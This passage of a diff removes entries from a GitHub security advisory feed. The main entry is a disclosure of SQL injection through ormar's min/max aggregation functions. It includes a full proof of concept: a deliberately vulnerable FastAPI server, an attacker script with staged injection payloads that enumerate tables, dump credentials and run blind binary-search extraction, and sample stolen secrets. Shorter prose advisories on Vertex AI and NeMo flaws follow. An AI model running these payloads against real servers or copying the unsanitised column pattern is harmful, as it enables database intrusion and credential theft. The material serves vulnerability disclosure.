-<li>The vulnerable server (<code>poc_server.py</code>) is based on the <strong>official ormar FastAPI example</strong> (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py"></a><a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">ormar/examples/fastapi_quick_start.py</a>). The only modification is the addition of a <code>/items/stats</code> endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.</li>
-</ol>
-<p>The server defines three models:</p>
-<ul>
-<li><code>Category</code> and <code>Item</code> — from the official ormar example (unchanged)</li>
-<li><code>AdminUser</code> — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API</li>
-</ul>
-<p>The vulnerable endpoint:</p>
-<pre><code class="language-python"># Added endpoint: aggregate statistics (VULNERABLE)
-# This is a common and natural pattern — letting users request
-# statistics on different columns. The ormar documentation itself
-# shows: await Book.objects.max(columns=["year"])
-# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;
-
-@app.get("/items/stats")
-async def item_stats(
-    metric: str = Query("max", description="max or min"),
-    column: str = Query("price", description="Column to aggregate"),
-):
-    """Return aggregate statistics for items."""
-    if metric == "max":
-        result = await Item.objects.max(column)
-    elif metric == "min":
-        result = await Item.objects.min(column)
-    else:
-        return {"error": "Unsupported metric"}
-    return {"metric": metric, "column": column, "result": result}
-</code></pre>
-<p>The database contains:</p>
-<table>
-<thead>
-<tr>
-<th>Table</th>
-<th>Data</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>categories</code></td>
-<td>Electronics</td>
-</tr>
-<tr>
-<td><code>items</code></td>
-<td>Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99)</td>
-</tr>
-<tr>
-<td><code>admin_users</code></td>
-<td>root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod</td>
-</tr>
-<tr>
-<td></td>
-<td>deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci</td>
-</tr>
-</tbody></table>
-<p>The <code>admin_users</code> table is <strong>NOT</strong> exposed via any API endpoint.</p>
-<h2 id="the-attack-steps">The attack steps</h2>
-<p>The PoC requires two terminals:</p>
-<p><strong>Terminal 1</strong> — Start the vulnerable server:</p>
-<pre><code class="language-bash">python poc_server.py
-</code></pre>
-<p><strong>Terminal 2</strong> — Run the attacker script:</p>
-<pre><code class="language-bash">python poc_attacker.py
-</code></pre>
-<p>The attacker script (<code>poc_attacker.py</code>) sends HTTP requests to the running server. It has <strong>NO prior knowledge</strong> of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single <code>/items/stats</code> endpoint.</p>
-<h2 id="principle-of-vulnerability-exploitation">Principle of vulnerability exploitation</h2>
-<h3 id="1-the-attacker-confirms-injection-by-sending-an-arithmetic-expression">1. The attacker confirms injection by sending an arithmetic expression</h3>
-<p>The attacker sends <code>GET /items/stats?metric=max&amp;column=1+1</code>. The data flow is:</p>
-<pre><code>HTTP request: GET /items/stats?metric=max&amp;column=1+1
-    ↓
-item_stats(metric="max", column="1+1")                # poc_server.py
-    ↓
-Item.objects.max("1+1")                                # queryset.py:721
-    ↓
-_query_aggr_function(func_name="max", columns=["1+1"]) # queryset.py:704
-    ↓
-SelectAction(select_str="1+1", model_cls=Item)          # select_action.py:22
-    ↓
-_split_value_into_parts("1+1")  →  self.field_name = "1+1"
-    ↓
-# min/max skip the is_numeric check (line 709 only checks sum/avg)
-    ↓
-get_text_clause()  →  sqlalchemy.text("1+1")            # select_action.py:43
-    ↓
-apply_func(sqlalchemy.func.max)  →  max(1+1)
-</code></pre>
-<p>Generated SQL:</p>
-<pre><code class="language-sql">SELECT max(1+1) AS "1+1"
-FROM (SELECT items.id AS id, items.name AS name, items.price AS price,
-             items.category AS category
-      FROM items) AS subquery_for_max
-</code></pre>
-<p>The API returns <code>{"metric":"max","column":"1+1","result":2}</code>, confirming that the arithmetic expression was evaluated as SQL.</p>
-<h3 id="2-the-attacker-enumerates-database-tables">2. The attacker enumerates database tables</h3>
-<p>The attacker injects a subquery to read <code>sqlite_master</code>:</p>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
-</code></pre>
-<p>Which internally calls:</p>
-<pre><code class="language-python">await Item.objects.max(
-    "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
-)
-</code></pre>
-<p>Generated SQL:</p>
-<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))
-       AS "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
-FROM (SELECT items.id, items.name, items.price, items.category
-      FROM items) AS subquery_for_max
-</code></pre>
-<p>The API returns <code>categories,admin_users,items</code>, revealing the hidden <code>admin_users</code> table.</p>
-<h3 id="3-the-attacker-extracts-the-schema-of-the-target-table">3. The attacker extracts the schema of the target table</h3>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT sql FROM sqlite_master WHERE name='admin_users')
-</code></pre>
-<p>The API returns the full <code>CREATE TABLE</code> statement, revealing column names: <code>username</code>, <code>password</code>, <code>api_key</code>.</p>
-<h3 id="4-the-attacker-dumps-all-credentials-in-a-single-query">4. The attacker dumps all credentials in a single query</h3>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)
-</code></pre>
-<p>Generated SQL:</p>
-<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))
-            FROM admin_users))
-       AS "..."
-FROM (SELECT items.id, items.name, items.price, items.category
-      FROM items) AS subquery_for_max
-</code></pre>
-<p>The API returns all credentials:</p>
-<pre><code>root | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod
-deploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci
-</code></pre>
-<h3 id="5-blind-boolean-based-extraction-when-results-are-not-directly-visible">5. Blind boolean-based extraction (when results are not directly visible)</h3>
-<p>Even if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:</p>
-<pre><code>GET /items/stats?metric=max&amp;column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 THEN 1 ELSE 0 END
-</code></pre>
-<p>Which internally calls:</p>
-<pre><code class="language-python"># "Is the Nth character of root's password greater than ASCII code M?"
-await Item.objects.max(
-    "CASE WHEN UNICODE(SUBSTR("
-    "(SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 "
-    "THEN 1 ELSE 0 END"
-)
-# Returns 0 → first character is 'S' (ASCII 83)
-</code></pre>
-<p>By iterating over each position with binary search, the full password <code>Sup3r$ecretP@ss!</code> is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).</p>
-<h3 id="6-the-attacker-extracts-the-production-api-key">6. The attacker extracts the production API key</h3>
-<pre><code>GET /items/stats?metric=max&amp;column=(SELECT api_key FROM admin_users WHERE username='root')
-</code></pre>
-<p>The API returns: <code>ak-9f8e7d6c5b4a3210-prod</code></p>
-<p>All data was extracted through a single public API endpoint using only unauthenticated GET requests.</p>
-<h2 id="the-complete-poc">The complete POC</h2>
-<h3 id="poc_serverpy-vulnerable-server">poc_server.py (Vulnerable Server)</h3>
-<p>Based on the official ormar FastAPI example (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py"></a><a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">fastapi_quick_start.py</a>):</p>
-<pre><code class="language-python">"""
-CVE PoC — Vulnerable Server
-=============================
-Based on the OFFICIAL ormar FastAPI example:
-    &lt;https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py&gt;
-
-The only modification is the addition of a /items/stats endpoint (line 63-76),
-which is a common pattern for any application that provides aggregate statistics.
-
-Usage:
-    python poc_server.py
-"""
-
-# ── Original official example code (unchanged) ───────────────
-# Source: ormar/examples/fastapi_quick_start.py
-
-from contextlib import asynccontextmanager
-from typing import List, Optional
-
-import databases
-import ormar
-import sqlalchemy
-import uvicorn
-from fastapi import FastAPI, Query
-
-DATABASE_URL = "sqlite:///poc_vuln.db"
-
-ormar_base_config = ormar.OrmarConfig(
-    database=databases.Database(DATABASE_URL), metadata=sqlalchemy.MetaData()
-)
-
-class Category(ormar.Model):
-    ormar_config = ormar_base_config.copy(tablename="categories")
-
-    id: int = ormar.Integer(primary_key=True)
-    name: str = ormar.String(max_length=100)
-
-class Item(ormar.Model):
-    ormar_config = ormar_base_config.copy(tablename="items")
-
-    id: int = ormar.Integer(primary_key=True)
-    name: str = ormar.String(max_length=100)
-    price: float = ormar.Float(default=0)
-    category: Optional[Category] = ormar.ForeignKey(Category, nullable=True)
-
-# This table simulates internal data that should NOT be accessible
-# through the public API — e.g. an admin_users table in the same database.
-class AdminUser(ormar.Model):
-    ormar_config = ormar_base_config.copy(tablename="admin_users")
-
-    id: int = ormar.Integer(primary_key=True)
-    username: str = ormar.String(max_length=100)
-    password: str = ormar.String(max_length=200)
-    api_key: str = ormar.String(max_length=200)
-
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    database_ = ormar_base_config.database
-    if not database_.is_connected:
-        await database_.connect()
-
-    # Create tables
-    engine = sqlalchemy.create_engine(DATABASE_URL)
-    ormar_base_config.metadata.create_all(engine)
-    engine.dispose()
-
-    # Seed sample data
-    if not await Item.objects.count():
-        cat = await Category.objects.create(name="Electronics")
-        await Item.objects.create(name="Laptop", price=999.99, category=cat)
-        await Item.objects.create(name="Phone", price=699.99, category=cat)
-        await Item.objects.create(name="Tablet", price=449.99, category=cat)
-        await Item.objects.create(name="Monitor", price=329.99, category=cat)
-
-    if not await AdminUser.objects.count():
-        await AdminUser.objects.create(
-            username="root",
-            password="Sup3r$ecretP@ss!",
-            api_key="ak-9f8e7d6c5b4a3210-prod",
-        )
-        await AdminUser.objects.create(
-            username="deploy-bot",
-            password="ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi",
-            api_key="ak-1a2b3c4d5e6f7890-ci",
-        )
-
-    print("\\n  [Server] Ready. Database seeded with items + admin_users.")
-    print("  [Server] The admin_users table is NOT exposed via any API endpoint.\\n")
-
-    yield
-
-    if database_.is_connected:
-        await database_.disconnect()
-
-app = FastAPI(
-    title="Item Catalog API",
-    description="Based on official ormar FastAPI example",
-    lifespan=lifespan,
-)
-
-# ── Original endpoints from official example (unchanged) ──────
-
-@app.get("/items/", response_model=List[Item])
-async def get_items():
-    items = await Item.objects.select_related("category").all()
-    return items
-
-@app.post("/items/", response_model=Item)
-async def create_item(item: Item):
-    await item.save()
-    return item
-
-@app.post("/categories/", response_model=Category)
-async def create_category(category: Category):
-    await category.save()
-    return category
-
-@app.put("/items/{item_id}")
-async def get_item(item_id: int, item: Item):
-    item_db = await Item.objects.get(pk=item_id)
-    return await item_db.update(**item.model_dump())
-
-@app.delete("/items/{item_id}")
-async def delete_item(item_id: int, item: Item = None):
-    if item:
-        return {"deleted_rows": await item.delete()}
-    item_db = await Item.objects.get(pk=item_id)
-    return {"deleted_rows": await item_db.delete()}
-
-# ── Added endpoint: aggregate statistics (VULNERABLE) ─────────
-# This is a common and natural pattern — letting users request
-# statistics on different columns. The ormar documentation itself
-# shows: await Book.objects.max(columns=["year"])
-# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;
-
-@app.get("/items/stats")
-async def item_stats(
-    metric: str = Query("max", description="max or min"),
-    column: str = Query("price", description="Column to aggregate"),
-):
-    """Return aggregate statistics for items."""
-    if metric == "max":
-        result = await Item.objects.max(column)
-    elif metric == "min":
-        result = await Item.objects.min(column)
-    else:
-        return {"error": "Unsupported metric"}
-    return {"metric": metric, "column": column, "result": result}
-
-@app.get("/health")
-async def health():
-    return {"status": "ok"}
-
-# ── Main ──────────────────────────────────────────────────────
-if __name__ == "__main__":
-    import os
-    # Clean previous database for reproducibility
-    if os.path.exists("poc_vuln.db"):
-        os.unlink("poc_vuln.db")
-    print("=" * 60)
-    print("  CVE PoC — Vulnerable Server")
-    print("  Based on: ormar/examples/fastapi_quick_start.py")
-    print("  Added:    GET /items/stats?metric=max&amp;column=&lt;input&gt;")
-    print("  Docs:     &lt;http://127.0.0.1:8000/docs&gt;")
-    print("=" * 60)
-    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
-</code></pre>
-<h3 id="poc_attackerpy-attacker-script">poc_attacker.py (Attacker Script)</h3>
-<pre><code class="language-python">"""
-CVE PoC — Attacker Script
-===========================
-Exploits the SQL injection in /items/stats endpoint.
-Sends HTTP requests to the running FastAPI server.
-
-Prerequisites:
-    1. Start the server first:  python poc_server.py
-    2. Then run this script:    python poc_attacker.py
-
-The attacker has NO prior knowledge of the database schema.
-All information is discovered through the injection.
-"""
-
-import sys
-import httpx
-
-TARGET = "&lt;http://127.0.0.1:8000&gt;"
-ENDPOINT = "/items/stats"
-
-def inject(payload: str) -&gt; str:
-    """Send a single injection payload via the public API."""
-    resp = httpx.get(TARGET + ENDPOINT, params={"metric": "max", "column": payload})
-    data = resp.json()
-    return data.get("result")
-
-def main():
-    # ── Pre-check ─────────────────────────────────────────────
-    try:
-        r = httpx.get(TARGET + "/health", timeout=3)
-        if r.status_code != 200:
-            sys.exit(1)
-    except httpx.ConnectError:
-        print(f"Cannot connect to {TARGET}")
-        print(f"Start the server first: python poc_server.py")
-        sys.exit(1)
-
-    # ── Stage 0: Legitimate request ──────────────────────────
-    result = inject("price")
-    print(f"[Stage 0] Normal usage: max(price) = {result}")
-
-    # ── Stage 1: Confirm injection ────────────────────────────
-    result = inject("1+1")
-    print(f"[Stage 1] max('1+1') = {result}")
-    if result == 2:
-        print("  → SQL INJECTION CONFIRMED")
-
-    # ── Stage 2: Enumerate tables ─────────────────────────────
-    payload = "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
-    result = inject(payload)
-    tables = str(result).split(",") if result else []
-    print(f"[Stage 2] Tables: {result}")
-
-    # ── Stage 3: Extract schema ───────────────────────────────
-    target_table = [t for t in tables if "admin" in t.lower()]
-    target_table = target_table[0] if target_table else tables[-1]
-    payload = f"(SELECT sql FROM sqlite_master WHERE name='{target_table}')"
-    result = inject(payload)
-    print(f"[Stage 3] Schema of {target_table}: {result}")
-
-    # ── Stage 4: Dump all credentials ─────────────────────────
-    payload = (
-        f"(SELECT GROUP_CONCAT("
-        f"username || ' | ' || password || ' | ' || api_key, CHAR(10))"
-        f" FROM {target_table})"
-    )
-    result = inject(payload)
-    print(f"[Stage 4] Credentials:\\n{result}")
-
-    # ── Stage 5: Blind extraction ─────────────────────────────
-    payload = f"LENGTH((SELECT password FROM {target_table} WHERE username='root'))"
-    pw_len = int(inject(payload))
-    extracted = ""
-    request_count = 0
-    for pos in range(1, pw_len + 1):
-        low, high = 32, 126
-        while low &lt;= high:
-            mid = (low + high) // 2
-            payload = (
-                f"CASE WHEN UNICODE(SUBSTR("
-                f"(SELECT password FROM {target_table} "
-                f"WHERE username='root'),{pos},1))&gt;{mid} "
-                f"THEN 1 ELSE 0 END"
-            )
-            result = inject(payload)
-            request_count += 1
-            if result == 1:
-                low = mid + 1
-            else:
-                high = mid - 1
-        extracted += chr(low)
-        sys.stdout.write(f"\\r[Stage 5] Extracting: {extracted}")
-        sys.stdout.flush()
-    print(f"\\n[Stage 5] Password extracted: {extracted} ({request_count} requests)")
-
-    # ── Stage 6: Steal API key ────────────────────────────────
-    payload = f"(SELECT api_key FROM {target_table} WHERE username='root')"
-    result = inject(payload)
-    print(f"[Stage 6] Production API key: {result}")
-
-    print(f"\\nTotal HTTP requests: {request_count + 6}")
-    print("All data extracted through a single public API endpoint.")
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<h2 id="vulnerability-impact">Vulnerability Impact</h2>
-<p>This attack allows an unauthenticated user to read the entire database contents. Any API endpoint that passes user-controlled input to <code>Model.objects.min()</code> or <code>Model.objects.max()</code> becomes a full SQL injection entry point.</p>
-<p>The attack is confirmed to work with the following database backends:</p>
-<ul>
-<li>SQLite (via aiosqlite)</li>
-<li>PostgreSQL (via asyncpg) — subquery syntax is identical</li>
-<li>MySQL (via aiomysql) — subquery syntax is compatible</li>
-</ul>
-<p><strong>Realistic attack scenarios include:</strong></p>
-<ul>
-<li><strong>REST APIs</strong> with user-selectable aggregate fields: <code>GET /items/stats?column=&lt;input&gt;</code></li>
-<li><strong>GraphQL resolvers</strong> that accept field names as arguments</li>
-<li><strong>Dynamic report generators</strong> where users select columns for aggregation</li>
-</ul>
-<p>The vulnerable server in this PoC is based on the <strong>official ormar FastAPI example</strong>, demonstrating that the vulnerability is easily triggered through natural, documented API design patterns. The ormar documentation itself shows this exact usage pattern: <code>await Book.objects.max(columns=["year"])</code> (<a href="https://collerek.github.io/ormar/queries/aggregations/"></a><a href="https://collerek.github.io/ormar/queries/aggregations/">ormar aggregations docs</a>).</p>
-<h2 id="display-of-attack-results">Display of attack results</h2>
-<p>Terminal 1 — Start server:
-<img alt="image" src="https://github.com/user-attachments/assets/4c8b4a20-75da-4aba-b649-f818e46165dd">
-Terminal 2 — Run attacker:
-<img src="https://github.com/user-attachments/assets/ae41657b-2730-4fab-ac01-e79acd267bde" alt="image (1)" height="1478" width="2004">
-<img src="https://github.com/user-attachments/assets/cbe0d652-d4d4-458c-998b-e636d6c362a1" alt="image (2)" height="1500" width="1984"></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/collerek/ormar/security/advisories/GHSA-xxh2-68g9-8jqr">https://github.com/collerek/ormar/security/advisories/GHSA-xxh2-68g9-8jqr</a></li>
-<li><a href="https://github.com/collerek/ormar/commit/a03bae14fe01358d3eaf7e319fcd5db2e4956b16">https://github.com/collerek/ormar/commit/a03bae14fe01358d3eaf7e319fcd5db2e4956b16</a></li>
-<li><a href="https://github.com/collerek/ormar/releases/tag/0.23.0">https://github.com/collerek/ormar/releases/tag/0.23.0</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26198">https://nvd.nist.gov/vuln/detail/CVE-2026-26198</a></li>
-<li><a href="https://github.com/advisories/GHSA-xxh2-68g9-8jqr">https://github.com/advisories/GHSA-xxh2-68g9-8jqr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xxh2-68g9-8jqr</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-02-23T22:12:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[google-cloud-aiplatform] Google Cloud Vertex AI SDK affected by Stored Cross-Site Scripting (XSS)]]></title>
-        <id>https://github.com/advisories/GHSA-qv8j-hgpc-vrq8</id>
-        <link href="https://github.com/advisories/GHSA-qv8j-hgpc-vrq8"/>
-        <updated>2026-02-20T22:41:46.000Z</updated>
-        <content type="html"><![CDATA[<p>Stored Cross-Site Scripting (XSS) in the _genai/_evals_visualization component of Google Cloud Vertex AI SDK (google-cloud-aiplatform) versions from 1.98.0 up to (but not including) 1.131.0 allows an unauthenticated remote attacker to execute arbitrary JavaScript in a victim's Jupyter or Colab environment via injecting script escape sequences into model evaluation results or dataset JSON data.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2472">https://nvd.nist.gov/vuln/detail/CVE-2026-2472</a></li>
-<li><a href="https://docs.cloud.google.com/support/bulletins#gcp-2026-011">https://docs.cloud.google.com/support/bulletins#gcp-2026-011</a></li>
-<li><a href="https://github.com/googleapis/python-aiplatform/commit/8a00d43dbd24e95dbab6ea32c63ce0a5a1849480">https://github.com/googleapis/python-aiplatform/commit/8a00d43dbd24e95dbab6ea32c63ce0a5a1849480</a></li>
-<li><a href="https://github.com/googleapis/python-aiplatform/releases/tag/v1.131.0">https://github.com/googleapis/python-aiplatform/releases/tag/v1.131.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-qv8j-hgpc-vrq8">https://github.com/advisories/GHSA-qv8j-hgpc-vrq8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qv8j-hgpc-vrq8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-20T21:31:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[google-cloud-aiplatform] Google Cloud Vertex AI has a a vulnerability involving predictable bucket naming]]></title>
-        <id>https://github.com/advisories/GHSA-wh2j-26j7-9728</id>
-        <link href="https://github.com/advisories/GHSA-wh2j-26j7-9728"/>
-        <updated>2026-02-20T22:41:43.000Z</updated>
-        <content type="html"><![CDATA[<p>Predictable bucket naming in Vertex AI Experiments in Google Cloud Vertex AI from version 1.21.0 up to&nbsp;(but not including) 1.133.0 on Google Cloud Platform allows an unauthenticated remote attacker to achieve cross-tenant remote code execution, model theft, and poisoning via pre-creating predictably named Cloud Storage buckets (Bucket Squatting).</p>
-<p>This vulnerability was patched and no customer action is needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2473">https://nvd.nist.gov/vuln/detail/CVE-2026-2473</a></li>
-<li><a href="https://docs.cloud.google.com/support/bulletins#gcp-2026-012">https://docs.cloud.google.com/support/bulletins#gcp-2026-012</a></li>
-<li><a href="https://github.com/googleapis/python-aiplatform/releases/tag/v1.133.0">https://github.com/googleapis/python-aiplatform/releases/tag/v1.133.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-wh2j-26j7-9728">https://github.com/advisories/GHSA-wh2j-26j7-9728</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wh2j-26j7-9728</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-20T21:31:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nemo-toolkit] NVIDIA NeMo Framework Deserializes Untrusted Data]]></title>
-        <id>https://github.com/advisories/GHSA-hvjw-vp7g-39h5</id>
-        <link href="https://github.com/advisories/GHSA-hvjw-vp7g-39h5"/>
-        <updated>2026-02-20T22:37:38.000Z</updated>
-        <content type="html"><![CDATA[<p>NVIDIA NeMo Framework contains a vulnerability where an attacker could cause remote code execution by convincing a user to load a maliciously crafted file. A successful exploit of this vulnerability might lead to code execution, denial of service, information disclosure, and data tampering.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-33253">https://nvd.nist.gov/vuln/detail/CVE-2025-33253</a></li>
-<li><a href="https://nvidia.custhelp.com/app/answers/detail/a_id/5762">https://nvidia.custhelp.com/app/answers/detail/a_id/5762</a></li>
-<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-33253">https://www.cve.org/CVERecord?id=CVE-2025-33253</a></li>
-<li><a href="https://github.com/advisories/GHSA-hvjw-vp7g-39h5">https://github.com/advisories/GHSA-hvjw-vp7g-39h5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hvjw-vp7g-39h5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-18T15:31:26.000Z</published>
     </entry>
 </feed>
